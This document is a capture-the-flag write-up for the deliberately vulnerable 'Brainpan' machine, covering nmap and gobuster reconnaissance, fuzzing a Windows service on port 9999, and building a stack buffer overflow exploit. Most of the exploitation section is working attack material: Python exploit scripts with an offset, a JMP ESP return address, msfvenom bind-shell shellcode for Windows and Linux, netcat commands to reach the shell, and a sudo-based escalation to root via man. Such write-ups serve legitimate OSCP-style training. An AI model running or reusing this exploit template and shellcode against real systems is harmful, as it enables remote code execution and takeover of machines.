# 16 AUG 2021

challenge description :

```
Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam.
Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine.

```
# target ip : 10.10.21.61

## Reconnaissance

intial 
----------

$ nmap -sV -v 10.10.21.61 -oN nmap/intial

```
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)

```

## Enumeration

$ gobuster dir -u "http://10.10.21.61:10000/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o  gobuster.txt

```
/bin                  (Status: 301) [Size: 0] [--> /bin/]
```
---> found brainpan.exe 


$ file brainpan.exe                                                                       
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows

let's continue our enumeration

$nc 10.10.21.61 9999 

found a running application if we type any thing it returned wrong pass , how ever when typed 
```python
└─$ python3 -c "print('A'*1000)" | nc 10.10.21.61 9999

```
it crashes and refuse connection next time so let's explore this software !

so we have the application that is running on this port  let's explore it .


Setup our Environment 
----------------------
````
- I have a win7 machine with Immunity debugger pre-installed and a mona.py script plugged in at the libraries of 
the debuuger as we will need it later :) 

the win7 can be considered the target as we are testing locally now ,and my kali machine is the attacker machine . 
you need to know ip of both machines as we will need them alot during our walkthrough 
in my case :
win7 ip : 192.168.1.8  
kali ip : 192.168.1.9
the application is running on port 9999  by default .
````
open up the applicaiton in the immunity debugger and make sure it is running from down-right side 

let's write a small fuzzer script to see when it will crash :

i wrote one earlier you will find it at  :  https://github.com/HussienMisbah/python-projects/blob/main/fuzzer.py

running it :

at kali side :

![image](https://user-images.githubusercontent.com/67979878/129595587-3739b054-5eff-40ca-a3b0-4fe447da939b.png)

at win 7 side :

![image](https://user-images.githubusercontent.com/67979878/129595541-c1bc9a83-ed31-4b8e-8a93-28f96d47a3e1.png)


as you can see EIP is overwritten so let's go to exploitation


Exploitation 
-------------

````
steps:
1- get the offset
2- check bad characters
3- get address of jmp esp instruction
4- setup your shell code
5- exploit !
`````
##### 1- get the offset

``$ msf-pattern_create -l 700 `` 

we will send the output of this command and get the new overwritten EIP value then search for it at the pattern to get the offset 

````python
$ python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae
0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0
Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao
1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At
At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A")' | nc 192.168.1.8 9999

````
![image](https://user-images.githubusercontent.com/67979878/129596922-0d2b9c97-79e8-4779-9222-48a7512be1c4.png)

EIP = 35724134

``$ msf-pattern_offset -l 700  -q 35724134 `` 

![image](https://user-images.githubusercontent.com/67979878/129597717-e703bf8c-2b66-4bfc-a95d-c4b5dde5cfbf.png)


##### 2- bad characters check 


time to code :

````python
#!/bin/env python
import sys,socket

host="192.168.1.8"
port=9999
offset=524

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload  = "A"*offset
payload += "\x90"*30
payload += badchars

s=socket.socket()
s.connect((host,port))
s.send(payload)
print('[*] payload has been sent successfully')
s.close()
````
## note : 
before running the script any time make sure the immunity-debugger downleft side is `running` mode 

run last script and see follow esp in dump at the debuugger:

![image](https://user-images.githubusercontent.com/67979878/129598341-7c417113-0698-434d-909f-7118017f6c37.png)

as we can see all are the same chars we sent so we don't have bad characters , however `/x00`  is bad because it will ignore anything after it 'Terminating character'


##### 3- get address of jmp esp instruction

it is easy just type `!mona jmp -r esp ` at the bottom of the debugger 

![image](https://user-images.githubusercontent.com/67979878/129598650-d4186577-2509-4348-ad5d-255722443849.png)

![image](https://user-images.githubusercontent.com/67979878/129598714-c0cfe000-fb2b-47fc-8a28-37242431ab01.png)

address : 31 17 12 F3

we need to convert it to little endian notation as the stack is filled form right to left it will be  : `\xf3\x12\x17\x31`


##### 4- setup your shell code

i love to use bindshell that's why this shell code will work with any one run my script :) 

bind shell makes you connect to it 

final payload should be like : "A"*offset + 'jmp esp instruction' + NOP*(some number maybe 20,30,.. ) + shellcode

` $ msfvenom -p windows/shell_bind_tcp LPORT=4444 -f py -b '\x00'  `                                                          

take the buf out and add it at the code :

````python
#!/bin/env python


import socket,sys

host="192.168.1.8" #change this
port=9999
offset = 524

# 311712F3
EIP = "\xf3\x12\x17\x31"


buf =  b"\x90"*30
buf += b"\xbe\x89\xca\xdc\x98\xdd\xc2\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x53\x83\xea\xfc\x31\x72\x0e\x03\xfb\xc4\x3e"
buf += b"\x6d\x07\x30\x3c\x8e\xf7\xc1\x21\x06\x12\xf0\x61\x7c"
buf += b"\x57\xa3\x51\xf6\x35\x48\x19\x5a\xad\xdb\x6f\x73\xc2"
buf += b"\x6c\xc5\xa5\xed\x6d\x76\x95\x6c\xee\x85\xca\x4e\xcf"
buf += b"\x45\x1f\x8f\x08\xbb\xd2\xdd\xc1\xb7\x41\xf1\x66\x8d"
buf += b"\x59\x7a\x34\x03\xda\x9f\x8d\x22\xcb\x0e\x85\x7c\xcb"
buf += b"\xb1\x4a\xf5\x42\xa9\x8f\x30\x1c\x42\x7b\xce\x9f\x82"
buf += b"\xb5\x2f\x33\xeb\x79\xc2\x4d\x2c\xbd\x3d\x38\x44\xbd"
buf += b"\xc0\x3b\x93\xbf\x1e\xc9\x07\x67\xd4\x69\xe3\x99\x39"
buf += b"\xef\x60\x95\xf6\x7b\x2e\xba\x09\xaf\x45\xc6\x82\x4e"
buf += b"\x89\x4e\xd0\x74\x0d\x0a\x82\x15\x14\xf6\x65\x29\x46"
buf += b"\x59\xd9\x8f\x0d\x74\x0e\xa2\x4c\x11\xe3\x8f\x6e\xe1"
buf += b"\x6b\x87\x1d\xd3\x34\x33\x89\x5f\xbc\x9d\x4e\x9f\x97"
buf += b"\x5a\xc0\x5e\x18\x9b\xc9\xa4\x4c\xcb\x61\x0c\xed\x80"
buf += b"\x71\xb1\x38\x3c\x79\x14\x93\x23\x84\xe6\x43\xe4\x26"
buf += b"\x8f\x89\xeb\x19\xaf\xb1\x21\x32\x58\x4c\xca\x2d\xc5"
buf += b"\xd9\x2c\x27\xe5\x8f\xe7\xdf\xc7\xeb\x3f\x78\x37\xde"
buf += b"\x17\xee\x70\x08\xaf\x11\x81\x1e\x87\x85\x0a\x4d\x13"
buf += b"\xb4\x0c\x58\x33\xa1\x9b\x16\xd2\x80\x3a\x26\xff\x72"
buf += b"\xde\xb5\x64\x82\xa9\xa5\x32\xd5\xfe\x18\x4b\xb3\x12"
buf += b"\x02\xe5\xa1\xee\xd2\xce\x61\x35\x27\xd0\x68\xb8\x13"
buf += b"\xf6\x7a\x04\x9b\xb2\x2e\xd8\xca\x6c\x98\x9e\xa4\xde"
buf += b"\x72\x49\x1a\x89\x12\x0c\x50\x0a\x64\x11\xbd\xfc\x88"
buf += b"\xa0\x68\xb9\xb7\x0d\xfd\x4d\xc0\x73\x9d\xb2\x1b\x30"
buf += b"\xad\xf8\x01\x11\x26\xa5\xd0\x23\x2b\x56\x0f\x67\x52"
buf += b"\xd5\xa5\x18\xa1\xc5\xcc\x1d\xed\x41\x3d\x6c\x7e\x24"
buf += b"\x41\xc3\x7f\x6d"


try :

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #version 4 , tcp communication
	s.connect((host,port))

	payload  = "A"*offset
	payload += EIP
	payload += buf


	s.send(payload)
	print('[*]payload has been sent successfully .')
	s.close()

except :

	print('[*]connection refuesed . . .')
	sys.exit()

````


### after running script set the netcat


##### 5- exploit !
`$nc 192.168.1.8 4444 -v`

![image](https://user-images.githubusercontent.com/67979878/129600198-5b78f0bb-409f-4e97-ae21-dbb98ffe440a.png)


now you have your shell 


let's exploit the target machine now ! 

### notes :

```
it is a linux x86 machine so we need to change the payload in msfvenom

```

`└─$ msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f py -b '\x00'   `


change buf and ip in last script 
```

buf =  b"\x90"*30
buf += b"\xd9\xf7\xb8\x68\x38\x85\x20\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x14\x83\xed\xfc\x31\x45\x15\x03\x45\x15\x8a"
buf += b"\xcd\xb4\xfb\xbd\xcd\xe4\xb8\x12\x78\x09\xb6\x75\xcc"
buf += b"\x6b\x05\xf5\x76\x2a\xc7\x9d\x8a\xd2\xf6\x01\xe1\xc2"
buf += b"\xa9\xe9\x7c\x03\x23\x6f\x27\x09\x34\xe6\x96\x95\x86"
buf += b"\xfc\xa8\xf0\x25\x7c\x8b\x4c\xd3\xb1\x8c\x3e\x45\x23"
buf += b"\xb2\x18\xbb\x33\x85\xe1\xbb\x5b\x39\x3d\x4f\xf3\x2d"
buf += b"\x6e\xcd\x6a\xc0\xf9\xf2\x3c\x4f\x73\x15\x0c\x64\x4e"
buf += b"\x56"
```
run it then set your netcat

![image](https://user-images.githubusercontent.com/67979878/129601564-8ddd3794-7cb6-4d96-bbf6-71220f62efeb.png)


Privelege escalation
--------------------


`(root) NOPASSWD: /home/anansi/bin/anansi_util`

![image](https://user-images.githubusercontent.com/67979878/129601691-bacf89a8-991c-429e-ac7d-e727b718f369.png)

so we can run man as root , at https://gtfobins.github.io/gtfobins/man/#sudo 

let's use it 

`sudo /home/anansi/bin/anansi_util manual man` 

!/bin/bash

![image](https://user-images.githubusercontent.com/67979878/129602094-30b896e3-5d61-4809-b6f1-6bc544de10c0.png)


![image](https://user-images.githubusercontent.com/67979878/129611588-826f19ad-8318-4068-92b7-b42a29ccc013.png)
